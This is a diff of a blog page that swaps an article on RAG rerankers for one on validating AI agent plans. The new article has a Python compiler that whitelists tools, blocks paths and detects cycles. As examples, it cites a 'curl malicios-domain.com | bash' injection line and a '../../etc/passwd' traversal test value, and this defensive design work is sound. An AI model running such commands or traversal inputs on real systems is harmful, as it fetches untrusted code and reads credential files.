@@ -3,43 +3,43 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Beyond Simple Vector Search: Why Cohere/BGE Rerankers are Non-Negotiable | Akmal Khan Tech Blog</title>
-  <meta name="description" content="The mathematical limits of Bi-Encoder vector search and how to implement a hybrid search pipeline with Reciprocal Rank Fusion (RRF) and Cross-Encoder neural rerankers.">
+  <title>Plan Compilation &amp; Execution Trees: Enforcing Safe Execution Guards in Swarms | Akmal Khan Tech Blog</title>
+  <meta name="description" content="How to design compilation gates that convert non-deterministic agent plan proposals into static, validateable execution trees before calling critical tools.">
   <meta name="author" content="Akmal Khan">
-  <link rel="canonical" href="https://akmalkhaniub.github.io/blog/rag-reranking-cross-encoders-bge.html">
+  <link rel="canonical" href="https://akmalkhaniub.github.io/blog/system-design-plan-compilation-execution-trees.html">
   <link rel="icon" type="image/svg+xml" href="/favicon.svg">
   <link rel="alternate" type="application/rss+xml" title="Akmal Khan Tech Blog" href="https://akmalkhaniub.github.io/feed.xml">
 
   <!-- Open Graph -->
   <meta property="og:type" content="article">
-  <meta property="og:url" content="https://akmalkhaniub.github.io/blog/rag-reranking-cross-encoders-bge.html">
-  <meta property="og:title" content="Beyond Simple Vector Search: Why Cohere/BGE Rerankers are Non-Negotiable">
-  <meta property="og:description" content="The mathematical limits of Bi-Encoder vector search and how to implement a hybrid search pipeline with Reciprocal Rank Fusion (RRF) and Cross-Encoder neural rerankers.">
+  <meta property="og:url" content="https://akmalkhaniub.github.io/blog/system-design-plan-compilation-execution-trees.html">
+  <meta property="og:title" content="Plan Compilation &amp; Execution Trees: Enforcing Safe Execution Guards in Swarms">
+  <meta property="og:description" content="How to design compilation gates that convert non-deterministic agent plan proposals into static, validateable execution trees before calling critical tools.">
   <meta property="og:image" content="https://github.com/akmalkhaniub.png">
   <meta property="og:site_name" content="Akmal Khan">
-  <meta property="article:published_time" content="2026-05-25">
+  <meta property="article:published_time" content="2026-07-03">
 
   <!-- Twitter Card -->
   <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="Beyond Simple Vector Search: Why Cohere/BGE Rerankers are Non-Negotiable">
-  <meta name="twitter:description" content="The mathematical limits of Bi-Encoder vector search and how to implement a hybrid search pipeline with Reciprocal Rank Fusion (RRF) and Cross-Encoder neural rerankers.">
+  <meta name="twitter:title" content="Plan Compilation &amp; Execution Trees: Enforcing Safe Execution Guards in Swarms">
+  <meta name="twitter:description" content="How to design compilation gates that convert non-deterministic agent plan proposals into static, validateable execution trees before calling critical tools.">
   <meta name="twitter:image" content="https://github.com/akmalkhaniub.png">
 
   <script type="application/ld+json">
 {
   "@context": "https://schema.org",
   "@type": "TechArticle",
-  "headline": "Beyond Simple Vector Search: Why Cohere/BGE Rerankers are Non-Negotiable",
-  "description": "The mathematical limits of Bi-Encoder vector search and how to implement a hybrid search pipeline with Reciprocal Rank Fusion (RRF) and Cross-Encoder neural rerankers.",
-  "url": "https://akmalkhaniub.github.io/blog/rag-reranking-cross-encoders-bge.html",
-  "datePublished": "2026-05-25",
-  "keywords": "RAG, Rerankers, pgvector, Python",
+  "headline": "Plan Compilation & Execution Trees: Enforcing Safe Execution Guards in Swarms",
+  "description": "How to design compilation gates that convert non-deterministic agent plan proposals into static, validateable execution trees before calling critical tools.",
+  "url": "https://akmalkhaniub.github.io/blog/system-design-plan-compilation-execution-trees.html",
+  "datePublished": "2026-07-03",
+  "keywords": "System Design, Verification, AI Agents, Python",
   "author": {
     "@type": "Person",
     "name": "Akmal Khan",
     "url": "https://akmalkhaniub.github.io/"
   },
-  "mainEntityOfPage": "https://akmalkhaniub.github.io/blog/rag-reranking-cross-encoders-bge.html"
+  "mainEntityOfPage": "https://akmalkhaniub.github.io/blog/system-design-plan-compilation-execution-trees.html"
 }
   </script>
 
@@ -93,128 +93,166 @@
 
         <article class="article-card">
           <div class="article-header">
-            <h1 class="article-title">Beyond Simple Vector Search: Why Cohere/BGE Rerankers are Non-Negotiable</h1>
+            <h1 class="article-title">Plan Compilation &amp; Execution Trees: Enforcing Safe Execution Guards in Swarms</h1>
             <div class="article-meta">
-              <span><i class="fa-regular fa-calendar"></i> May 26, 2026</span>
+              <span><i class="fa-regular fa-calendar"></i> July 4, 2026</span>
               <span><i class="fa-solid fa-user"></i> Akmal Khan</span>
-              <span><i class="fa-regular fa-clock"></i> 9 min read</span>
-              <div class="article-tags"><span class="project-badge">RAG</span><span class="project-badge">Rerankers</span><span class="project-badge">pgvector</span><span class="project-badge">Python</span></div>
+              <span><i class="fa-regular fa-clock"></i> 10 min read</span>
+              <div class="article-tags"><span class="project-badge">System Design</span><span class="project-badge">Verification</span><span class="project-badge">AI Agents</span><span class="project-badge">Python</span></div>
             </div>
           </div>
 
           <div class="article-body">
-<h1>Beyond Simple Vector Search: Why Cohere/BGE Rerankers are Non-Negotiable</h1>
+<h1>Plan Compilation &amp; Execution Trees: Enforcing Safe Execution Guards in Swarms</h1>
 <blockquote>
 <p>[!NOTE]
 <strong>📖 Article Overview</strong>
-Most basic Retrieval-Augmented Generation (RAG) tutorials stop at cosine similarity vector search. In production, however, raw vector search often fails to find the exact information needed. Because embedding models (Bi-encoders) represent whole documents as single coordinates, they prioritize general semantic context over specific, granular answers. This article explains why neural <strong>Rerankers (Cross-encoders)</strong> are essential for accurate RAG pipelines and demonstrates how to build a hybrid search, Reciprocal Rank Fusion (RRF), and BGE Reranker pipeline in Python.</p>
+When orchestrating autonomous multi-agent networks, we often allow models to self-direct their task execution by proposing natural language plans. However, executing unverified plans directly is highly dangerous: agents can easily introduce infinite routing loops, double-execute destructive database actions, or attempt to run unsandboxed shell scripts. In this article, we analyze the design of <strong>Plan Compilation Gates</strong>, construct a static tree compiler, and implement a Directed Acyclic Graph (DAG) validator in Python to enforce strict tool boundaries before execution begins.</p>
 </blockquote>
 <hr>
-<h2>The Limits of Bi-Encoders (Vector Embeddings)</h2>
-<p>Embedding models are <strong>Bi-encoders</strong>. They process the user query and the database documents independently, converting them into vectors to measure distance. While fast, this means the model cannot capture token-to-token interactions between the query and the candidate documents. </p>
-<p>A <strong>Cross-encoder</strong> (Reranker) takes the query and a document <em>together</em> as a single input, executing full self-attention across both. This produces a highly accurate relevancy score, but is too computationally expensive to run on millions of documents.</p>
-<div class="mermaid">%%{init: {'theme': 'dark', 'themeVariables': { 'primaryColor': '#0ea5e9', 'primaryTextColor': '#f3f4f6', 'primaryBorderColor': '#38bdf8', 'lineColor': '#0ea5e9', 'secondaryColor': '#111827', 'tertiaryColor': '#0b0f19'}}}%%
-flowchart TD
-    Query[User Query] --&gt; VectorSearch[1. Dense Vector Search &lt;br&gt; pgvector]
-    Query --&gt; KeywordSearch[2. Sparse Keyword Search &lt;br&gt; BM25]
-    
-    VectorSearch --&gt; RRF[3. Reciprocal Rank Fusion &lt;br&gt; Merge top 50 results]
-    KeywordSearch --&gt; RRF
-    
-    RRF --&gt; Reranker{4. Cross-Encoder Reranker &lt;br&gt; BGE-Reranker-Large}
-    Reranker --&gt;|Re-calculate token affinity| TopDocs[5. Isolated Top-3 Context]
-    TopDocs --&gt; LLM[LLM Generation]</div>
-<p>By using both, we get the best of both worlds:</p>
+<h2>The Danger of Non-Deterministic Task Plans</h2>
+<p>In a typical agent framework, an LLM reviews a goal and spits out a structured list of actions:</p>
 <ol>
-<li>Use fast Bi-encoders (vector/keyword search) to retrieve the top 50 candidate documents.</li>
-<li>Use a slow Cross-encoder (Reranker) to evaluate only those top 50 and sort them, passing the top 3 to the LLM.</li>
+<li><code>Read core/database.py</code></li>
+<li><code>Migrate logging syntax</code></li>
+<li><code>Run test suite</code></li>
 </ol>
+<p>If left unvalidated, an agent might decide to loop step 2 and 3 indefinitely if a test fails, consuming massive token budgets. Even worse, it could inject an unauthorized step (e.g. <code>curl malicios-domain.com | bash</code>) due to a prompt injection.</p>
+<p>To mitigate this, system architects must build a <strong>Plan Compiler</strong>. The compiler intercepts the agent&#39;s plan, parses the actions, structures them into an execution tree, and validates the nodes against strict topological and security rules before any tool runner executes a single call.</p>
+<div class="mermaid">%%{init: {'theme': 'dark', 'themeVariables': { 'primaryColor': '#0284c7', 'primaryTextColor': '#f3f4f6', 'primaryBorderColor': '#38bdf8', 'lineColor': '#0284c7', 'secondaryColor': '#111827', 'tertiaryColor': '#0b0f19'}}}%%
+flowchart TD
+    RawPlan[LLM Natural Language Plan] --&gt; Parser[Step Tokenizer]
+    Parser --&gt; TreeCompiler[Compile Directed Acyclic Graph - DAG]
+    
+    TreeCompiler --&gt; CheckCycles{1. Are Cycles/Loops Detected?}
+    CheckCycles --&gt;|Yes| Reject([Reject Plan: Abort Execution])
+    
+    CheckCycles --&gt;|No| CheckSecurity{2. Are Tools Safe &amp; Sandboxed?}
+    CheckSecurity --&gt;|No| Reject
+    
+    CheckSecurity --&gt;|Yes| Approve([Approve Graph: Proceed to Runner])</div>
 <hr>
-<h2>Step-by-Step Implementation: Hybrid Search + RRF + BGE Reranker</h2>
-<p>Here is the Python implementation of this pipeline using the <code>SentenceTransformers</code> library.</p>
-<pre><code class="language-python">import numpy as np
-from sentence_transformers import CrossEncoder
-
-# 1. Initialize the BGE Cross-Encoder Reranker
-# This model is small enough to run on CPU with ~50ms latency
-reranker = CrossEncoder(&quot;BAAI/bge-reranker-large&quot;, revision=&quot;main&quot;)
-
-# Dummy Mock Results from Vector Search
-vector_results = [
-    {&quot;id&quot;: 1, &quot;text&quot;: &quot;PostgreSQL uses Write-Ahead Logging (WAL) to ensure data integrity.&quot;, &quot;rank&quot;: 1},
-    {&quot;id&quot;: 2, &quot;text&quot;: &quot;Database backups can be scheduled using pg_dump and cron jobs.&quot;, &quot;rank&quot;: 2},
-    {&quot;id&quot;: 3, &quot;text&quot;: &quot;Redis maintains data in memory and supports snapshotting for persistence.&quot;, &quot;rank&quot;: 3}
-]
-
-# Dummy Mock Results from Keyword Search (BM25)
-keyword_results = [
-    {&quot;id&quot;: 2, &quot;text&quot;: &quot;Database backups can be scheduled using pg_dump and cron jobs.&quot;, &quot;rank&quot;: 1},
-    {&quot;id&quot;: 1, &quot;text&quot;: &quot;PostgreSQL uses Write-Ahead Logging (WAL) to ensure data integrity.&quot;, &quot;rank&quot;: 2},
-    {&quot;id&quot;: 4, &quot;text&quot;: &quot;Write-Ahead Logging writes changes to disk before updating pages.&quot;, &quot;rank&quot;: 3}
-]
-
-def reciprocal_rank_fusion(dense_runs, sparse_runs, k=60):
-    &quot;&quot;&quot;
-    Combines ranks from vector and keyword search using RRF formula:
-    score = sum(1 / (k + rank))
-    &quot;&quot;&quot;
-    scores = {}
-    documents = {}
-    
-    for run in [dense_runs, sparse_runs]:
-        for doc in run:
-            doc_id = doc[&quot;id&quot;]
-            documents[doc_id] = doc[&quot;text&quot;]
-            rank = doc[&quot;rank&quot;]
-            if doc_id not in scores:
-                scores[doc_id] = 0.0
-            scores[doc_id] += 1.0 / (k + rank)
-            
-    # Sort documents by RRF score
-    sorted_ids = sorted(scores, key=scores.get, reverse=True)
-    return [{&quot;id&quot;: doc_id, &quot;text&quot;: documents[doc_id]} for doc_id in sorted_ids]
-
-def rerank_documents(query: str, candidates: list[dict]) -&gt; list[dict]:
-    &quot;&quot;&quot;
-    Reranks candidate documents using BGE Cross-Encoder
-    &quot;&quot;&quot;
-    # Prepare query-document pairs for the cross-encoder
-    pairs = [[query, doc[&quot;text&quot;]] for doc in candidates]
-    
-    # Compute relevance scores (higher = more relevant)
-    scores = reranker.predict(pairs)
-    
-    # Attach scores to documents
-    for i, doc in enumerate(candidates):
-        doc[&quot;rerank_score&quot;] = float(scores[i])
-        
-    # Sort by rerank score descending
-    candidates.sort(key=lambda x: x[&quot;rerank_score&quot;], reverse=True)
-    return candidates
-
-# Execution Pipeline
-if __name__ == &quot;__main__&quot;:
-    query = &quot;How does PostgreSQL ensure data integrity?&quot;
-    
-    # 1. Merge Vector &amp; Keyword search results using RRF
-    merged_candidates = reciprocal_rank_fusion(vector_results, keyword_results)
-    print(&quot;Merged Candidates (RRF):&quot;, [doc[&quot;id&quot;] for doc in merged_candidates])
-    
-    # 2. Run BGE Reranker on the merged set
-    reranked_docs = rerank_documents(query, merged_candidates)
-    
-    print(&quot;\n--- Reranked Context Results ---&quot;)
-    for doc in reranked_docs[:2]:
-        print(f&quot;ID: {doc['id']}, Score: {doc['rerank_score']:.4f}&quot;)
-        print(f&quot;Text: {doc['text']}\n&quot;)</code></pre>
-<hr>
-<h2>🏁 Conclusion &amp; Takeaways</h2>
-<p>Rerankers are one of the most effective ways to boost your RAG system&#39;s accuracy:</p>
+<h2>1. Compiling Plans to Directed Acyclic Graphs (DAGs)</h2>
+<p>A secure task plan must be modelable as a Directed Acyclic Graph (DAG). </p>
 <ul>
-<li><input disabled="" type="checkbox"> <strong>Combine dense and sparse search</strong>: Use hybrid search (vector similarity + keyword matching) as your initial retrieval pass.</li>
-<li><input disabled="" type="checkbox"> <strong>Use Reciprocal Rank Fusion (RRF)</strong>: Blend results from different search indexes fairly before reranking.</li>
-<li><input disabled="" type="checkbox"> <strong>Deploy a Cross-encoder</strong>: Place a reranker (like BGE-Reranker or Cohere V3) in front of your LLM call.</li>
-<li><input disabled="" type="checkbox"> <strong>Measure latency tradeoffs</strong>: Keep your candidate list size (retrieval pool) limited to 50–100 documents to ensure reranking completes within 100ms.</li>
+<li><strong>Nodes</strong>: Individual tool executions (e.g. file reads, database writes).</li>
+<li><strong>Edges</strong>: Dependency relationships (e.g. Step B cannot run until Step A finishes).</li>
+<li><strong>Loop Elimination</strong>: By running topological sorting algorithms on the graph, the compiler can detect if the plan forms any cyclic loops (e.g. Step A -&gt; Step B -&gt; Step A), which would cause infinite tool executions.</li>
+</ul>
+<hr>
+<h2>2. Dynamic Tool Masking</h2>
+<p>During the validation phase, the compiler inspects each node&#39;s proposed tool name and arguments:</p>
+<ul>
+<li><strong>Scope Isolation</strong>: Ensuring that file paths are bounded strictly within the target repository directories, blocking access to <code>/etc/</code> or parent system trees.</li>
+<li><strong>Command Sandboxing</strong>: Blocking commands containing pipelines (<code>|</code>), redirects (<code>&gt;</code>), or execution scripts, forcing tools to use explicit parameters instead of raw shells.</li>
+</ul>
+<hr>
+<h2>Code Demo: Plan Compiler and DAG Validator</h2>
+<p>Below is a Python implementation of a plan compilation gateway. It takes a list of plan steps, constructs a DAG dependency tree, validates safety constraints, and runs topological verification.</p>
+<pre><code class="language-python">import sys
+from typing import List, Dict, Set, Tuple
+
+class PlanCompilationError(Exception):
+    pass
+
+class TaskPlanCompiler:
+    def __init__(self, allowed_tools: Set[str], blocked_paths: List[str]):
+        self.allowed_tools = allowed_tools
+        self.blocked_paths = blocked_paths
+
+    def compile_and_validate(self, raw_steps: List[Dict[str, Any]]) -&gt; List[str]:
+        # Adjacency list representation: {node: list of child dependencies}
+        graph: Dict[str, List[str]] = {}
+        in_degree: Dict[str, int] = {}
+        node_tools: Dict[str, str] = {}
+
+        # 1. Parse and validate individual step structures
+        for step in raw_steps:
+            step_id = step.get(&quot;id&quot;)
+            tool = step.get(&quot;tool&quot;)
+            args = step.get(&quot;args&quot;, {})
+            depends_on = step.get(&quot;depends_on&quot;, [])
+
+            # Check Tool Whitelist
+            if tool not in self.allowed_tools:
+                raise PlanCompilationError(f&quot;Security Alert: Unauthorized tool call attempted: '{tool}'&quot;)
+
+            # Check for Path Injection
+            for arg_val in args.values():
+                if isinstance(arg_val, str):
+                    for blocked in self.blocked_paths:
+                        if blocked in arg_val:
+                            raise PlanCompilationError(f&quot;Security Alert: Blocked directory scope access: '{arg_val}'&quot;)
+
+            node_tools[step_id] = tool
+            graph[step_id] = []
+            in_degree[step_id] = 0
+
+        # 2. Build dependency tree and check references
+        for step in raw_steps:
+            step_id = step.get(&quot;id&quot;)
+            for dep in step.get(&quot;depends_on&quot;, []):
+                if dep not in graph:
+                    raise PlanCompilationError(f&quot;Compilation Error: Undefined dependency reference: '{dep}'&quot;)
+                graph[dep].append(step_id)
+                in_degree[step_id] += 1
+
+        # 3. Topological Sort (Kahn's Algorithm) to detect circular loops
+        queue = [node for node in graph if in_degree[node] == 0]
+        sorted_order = []
+
+        while queue:
+            curr = queue.pop(0)
+            sorted_order.append(curr)
+            for neighbor in graph[curr]:
+                in_degree[neighbor] -= 1
+                if in_degree[neighbor] == 0:
+                    queue.append(neighbor)
+
+        if len(sorted_order) != len(graph):
+            raise PlanCompilationError(&quot;Compilation Error: Cyclic dependency loop detected in task plan.&quot;)
+
+        return sorted_order
+
+if __name__ == &quot;__main__&quot;:
+    allowed = {&quot;view_file&quot;, &quot;write_file&quot;, &quot;run_tests&quot;}
+    blocked = [&quot;/etc/&quot;, &quot;../&quot;, &quot;/windows/&quot;]
+    compiler = TaskPlanCompiler(allowed, blocked)
+
+    # Plan 1: Safe sequential execution
+    plan_1 = [
+        {&quot;id&quot;: &quot;step_1&quot;, &quot;tool&quot;: &quot;view_file&quot;, &quot;args&quot;: {&quot;file&quot;: &quot;core/auth.py&quot;}, &quot;depends_on&quot;: []},
+        {&quot;id&quot;: &quot;step_2&quot;, &quot;tool&quot;: &quot;write_file&quot;, &quot;args&quot;: {&quot;file&quot;: &quot;core/auth.py&quot;}, &quot;depends_on&quot;: [&quot;step_1&quot;]},
+        {&quot;id&quot;: &quot;step_3&quot;, &quot;tool&quot;: &quot;run_tests&quot;, &quot;args&quot;: {&quot;suite&quot;: &quot;tests/test_auth.py&quot;}, &quot;depends_on&quot;: [&quot;step_2&quot;]}
+    ]
+
+    # Plan 2: Unsafe circular dependency
+    plan_2 = [
+        {&quot;id&quot;: &quot;step_1&quot;, &quot;tool&quot;: &quot;view_file&quot;, &quot;args&quot;: {&quot;file&quot;: &quot;core/auth.py&quot;}, &quot;depends_on&quot;: [&quot;step_2&quot;]},
+        {&quot;id&quot;: &quot;step_2&quot;, &quot;tool&quot;: &quot;write_file&quot;, &quot;args&quot;: {&quot;file&quot;: &quot;core/auth.py&quot;}, &quot;depends_on&quot;: [&quot;step_1&quot;]}
+    ]
+
+    # Plan 3: Security violation (path traversal)
+    plan_3 = [
+        {&quot;id&quot;: &quot;step_1&quot;, &quot;tool&quot;: &quot;view_file&quot;, &quot;args&quot;: {&quot;file&quot;: &quot;../../etc/passwd&quot;}, &quot;depends_on&quot;: []}
+    ]
+
+    print(&quot;🛡️ Running Plan Compilation Verification...&quot;)
+    
+    for idx, plan in enumerate([plan_1, plan_2, plan_3], 1):
+        try:
+            order = compiler.compile_and_validate(plan)
+            print(f&quot;\nPlan #{idx}: APPROVED&quot;)
+            print(f&quot;👉 Execution Tree Order: {order}&quot;)
+        except PlanCompilationError as e:
+            print(f&quot;\nPlan #{idx}: REJECTED&quot;)
+            print(f&quot;   Reason: {e}&quot;)</code></pre>
+<hr>
+<h2>Architectural Guidelines</h2>
+<ul>
+<li><strong>Plan Verification Gates</strong>: Never feed natural language plans directly to executing agents. Enforce a compilation step to evaluate safety constraints.</li>
+<li><strong>Isolate Dependency Trees</strong>: Use topological sorting algorithms to guarantee execution plans do not form cycles or infinite loops.</li>
+<li><strong>Strict Sandboxing</strong>: Run all compiled tool runs within isolated workspace contexts, restricting tools from escaping boundary directories.</li>
 </ul>
 
           </div>
@@ -222,8 +260,8 @@ if __name__ == &quot;__main__&quot;:
           <div class="share-box">
             <span class="share-label"><i class="fa-solid fa-share-nodes"></i> Share:</span>
             <button id="share-link-btn" class="btn btn-sm btn-secondary"><i class="fa-regular fa-copy"></i> Copy Link</button>
-            <a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fakmalkhaniub.github.io%2Fblog%2Frag-reranking-cross-encoders-bge.html" target="_blank" rel="noopener" class="btn btn-sm btn-secondary"><i class="fa-brands fa-linkedin"></i> LinkedIn</a>
-            <a href="https://twitter.com/intent/tweet?text=Beyond%20Simple%20Vector%20Search%3A%20Why%20Cohere%2FBGE%20Rerankers%20are%20Non-Negotiable&url=https%3A%2F%2Fakmalkhaniub.github.io%2Fblog%2Frag-reranking-cross-encoders-bge.html" target="_blank" rel="noopener" class="btn btn-sm btn-secondary"><i class="fa-brands fa-x-twitter"></i> X / Twitter</a>
+            <a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fakmalkhaniub.github.io%2Fblog%2Fsystem-design-plan-compilation-execution-trees.html" target="_blank" rel="noopener" class="btn btn-sm btn-secondary"><i class="fa-brands fa-linkedin"></i> LinkedIn</a>
+            <a href="https://twitter.com/intent/tweet?text=Plan%20Compilation%20%26%20Execution%20Trees%3A%20Enforcing%20Safe%20Execution%20Guards%20in%20Swarms&url=https%3A%2F%2Fakmalkhaniub.github.io%2Fblog%2Fsystem-design-plan-compilation-execution-trees.html" target="_blank" rel="noopener" class="btn btn-sm btn-secondary"><i class="fa-brands fa-x-twitter"></i> X / Twitter</a>
           </div>
 
           <div class="newsletter-box">
@@ -252,7 +290,7 @@ if __name__ == &quot;__main__&quot;:
             <li class="sidebar-post-item">
               <a href="system-design-state-invariants-logic-assertions.html">State Invariants for Agentic Workflows: Enforcing Logic Assertions on Shared DB State<span class="sidebar-post-date">July 5, 2026</span></a>
             </li>
-            <li class="sidebar-post-item">
+            <li class="sidebar-post-item active">
               <a href="system-design-plan-compilation-execution-trees.html">Plan Compilation &amp; Execution Trees: Enforcing Safe Execution Guards in Swarms<span class="sidebar-post-date">July 4, 2026</span></a>
             </li>
             <li class="sidebar-post-item">
@@ -396,7 +434,7 @@ if __name__ == &quot;__main__&quot;:
             <li class="sidebar-post-item">
               <a href="tool-calling-contracts-error-recovery.html">Tool-Calling Contracts &amp; Error Recovery: Building Resilient Agent Tool Schemas<span class="sidebar-post-date">May 27, 2026</span></a>
             </li>
-            <li class="sidebar-post-item active">
+            <li class="sidebar-post-item">
               <a href="rag-reranking-cross-encoders-bge.html">Beyond Simple Vector Search: Why Cohere/BGE Rerankers are Non-Negotiable<span class="sidebar-post-date">May 26, 2026</span></a>
             </li>
             <li class="sidebar-post-item">
